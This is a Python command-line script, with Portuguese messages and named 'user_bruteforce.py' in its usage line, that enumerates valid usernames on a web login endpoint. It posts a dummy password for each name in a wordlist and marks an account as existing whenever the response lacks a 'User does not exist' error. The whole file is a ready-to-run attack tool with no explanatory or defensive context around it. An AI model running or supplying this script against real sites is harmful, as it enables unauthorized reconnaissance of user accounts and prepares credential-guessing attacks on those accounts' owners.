import requests
from colorama import Fore, Style
import sys
import json
import os

def load_headers_from_file(header_file):
    try:
        with open(header_file, 'r') as file:
            headers = json.load(file)
        return headers
    except (FileNotFoundError, json.JSONDecodeError):
        print()
        print(Fore.RED + "ERROR: Headers ou Arquivo Inválido!" + Style.RESET_ALL)
        sys.exit(1)

def check_user(username, headers, url):
    data = {
        'username': username,
        'password': 'password',
        'function': 'login'
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_users(user_file, headers, url):
    if not os.path.exists(user_file):
        print()
        print(Fore.RED + f"ERROR: O Arquivo '{user_file}' não foi Encontrado!" + Style.RESET_ALL)
        sys.exit(1)
    print()
    print(Fore.YELLOW + "Inicializando Força Bruta" + Style.RESET_ALL)
    print()
    valid_users = []
    invalid_error = "User does not exist"
    
    with open(user_file, 'r') as file:
        users = file.readlines()

    total_users = len(users)

    for index, user in enumerate(users):
        user = user.strip()
        if user:
            response_json = check_user(user, headers, url)
            progress = int(((index + 1) / total_users) * 100)
            progress_bar = "■" * (progress // 2) + " " * (50 - progress // 2)

            print(f"\rProgresso: [{progress_bar}] {progress}% ", end="")

            if response_json.get('status') == 'error' and invalid_error in response_json.get('message', ''):
                print(Fore.RED + "[0]" + Style.RESET_ALL, end=" ")
            else:
                print(Fore.GREEN + f"[1] {user}" + Style.RESET_ALL, end=" ")
                valid_users.append(user)

    print("\nUsuários válidos encontrados:")
    for valid_user in valid_users:
        print(Fore.GREEN + " " + valid_user + Style.RESET_ALL)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(Fore.RED + "Uso: python3 user_bruteforce.py <arquivo_headers.json> <arquivo_de_usuarios> <url>" + Style.RESET_ALL)
        sys.exit(1)

    header_file = sys.argv[1]
    user_file = sys.argv[2]
    url = sys.argv[3]

    headers = load_headers_from_file(header_file)
    enumerate_users(user_file, headers, url)
